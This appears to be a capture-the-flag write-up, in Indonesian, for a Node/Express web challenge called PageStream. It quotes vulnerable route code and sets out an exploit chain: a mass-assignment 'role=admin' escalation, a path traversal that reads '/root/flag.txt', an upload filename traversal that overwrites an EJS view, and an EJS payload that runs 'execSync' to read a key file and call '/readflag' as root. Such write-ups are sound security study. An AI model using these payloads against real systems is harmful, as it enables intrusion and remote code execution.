# PageStream — Analisis

[← Overview](51-pagestream.md) · [Index](index.md)

### 2.1 Mass assignment role

`routes/auth.js`:

```js
const handleProfileUpdate = (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    req.session.user = Object.assign({}, req.session.user, req.body);
    req.session.save(() => {
        if (req.headers['content-type'] && req.headers['content-type'].includes('application/json')) {
            return res.json({ ok: true, user: req.session.user });
        }
        res.render('settings', { user: req.session.user, success: 'Profile settings updated successfully.' });
    });
};

router.post('/profile', handleProfileUpdate);
router.post('/settings', handleProfileUpdate);
```

- `req.body` dari `express.urlencoded({ extended: true })` dan `express.json()`.
- Tidak ada allowlist field (`avatar`, `bio` saja yang seharusnya).
- Payload `role=admin` menimpa `req.session.user.role`.
- Session disimpan di MemoryStore; `req.session.save()` menulis perubahan.

`requireAdmin`:

```js
const requireAdmin = (req, res, next) => {
    if (!req.session.user) {
        return res.redirect('/login');
    }
    const role = req.session.user.role;
    if (role !== 'admin' && role !== 'verified') {
        return res.status(403).send('Forbidden: Account Email Verification required. ...');
    }
    next();
};
```

Setelah `role=admin`, semua route `requireAdmin` (`/post/new`, `/view`) dapat diakses.

### 2.2 Path traversal di `/view`

`routes/posts.js`:

```js
router.get('/view', requireAdmin, (req, res) => {
    const fileParam = req.query.file;
    if (!fileParam) {
        return res.status(400).send('Missing file parameter');
    }
    const targetPath = path.resolve(__dirname, '../uploads', fileParam);
    const stream = fs.createReadStream(targetPath);
    ...
    stream.pipe(res);
});
```

- `__dirname = /app/routes`.
- `path.resolve('/app/routes', '../uploads', '../../root/flag.txt')` → `/root/flag.txt`.
- Tidak ada pengecekan `targetPath.startsWith('/app/uploads/')`.
- Flag `/root/flag.txt` mode 600 root, tetapi proses Node berjalan sebagai root, jadi bisa dibaca.

### 2.3 Upload filename traversal

`routes/posts.js`:

```js
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, path.join(__dirname, '../uploads'));
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname);
    }
});

const upload = multer({
    storage: storage,
    preservePath: true
});
```

- `preservePath: true` mempertahankan path dari nama file multipart.
- `file.originalname` langsung dipakai sebagai filename.
- `path.join('/app/uploads', '../../pwned.txt')` → `/pwned.txt`.
- `path.join('/app/uploads', '../views/dashboard.ejs')` → `/app/views/dashboard.ejs`.

Dockerfile:

```dockerfile
RUN gcc -O2 -o /readflag readflag.c && \
    gcc -shared -fPIC -O2 -o helper.node helper.c && \
    chown root:root /readflag && \
    chmod 4755 /readflag && ...
RUN echo "NFX{dummy_flag_for_local_testing}" > /root/flag.txt && \
    chown root:root /root/flag.txt && chmod 600 /root/flag.txt
...
RUN chmod -R 555 /app && \
    chmod -R 777 /app/uploads /tmp /var/log
```

- `/app` dan file source mode 555, tetapi proses berjalan sebagai **root** (supervisord `user=root`), sehingga root dapat menimpa file meskipun mode 555 (DAC bypass untuk root).
- `helper.node` memiliki fungsi `pagestream_native_sync` yang memanggil `system(cmd)`, tetapi tidak dipakai di exploit kami. Ini adalah jalur RCE alternatif jika ada route yang memanggilnya.
- `/readflag` setuid root; `/etc/pagestream.key` dibuat oleh entrypoint dengan mode 644.

### 2.4 RCE via overwrite EJS view

EJS dirender oleh Express:

```js
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
```

`NODE_ENV` tidak diset, sehingga view cache Express nonaktif; template dibaca ulang tiap request. Menimpa `views/dashboard.ejs` dengan payload EJS:

```ejs
<%= global.process.mainModule.require('child_process')
    .execSync('id; echo ---KEY---; cat /etc/pagestream.key; echo ---FLAG---; '
            + '/readflag $(cat /etc/pagestream.key)').toString() %>
```

lalu `GET /dashboard` mengeksekusi perintah sebagai root.

### 2.5 Rantai penuh

```text
register user
  -> POST /profile role=admin          (mass assignment)
  -> GET /view?file=../../root/flag.txt (LFI, flag langsung)
     atau
  -> POST /post/new filename=../views/dashboard.ejs (arbitrary write)
  -> GET /dashboard                    (EJS RCE root)
  -> /readflag $(cat /etc/pagestream.key)
```
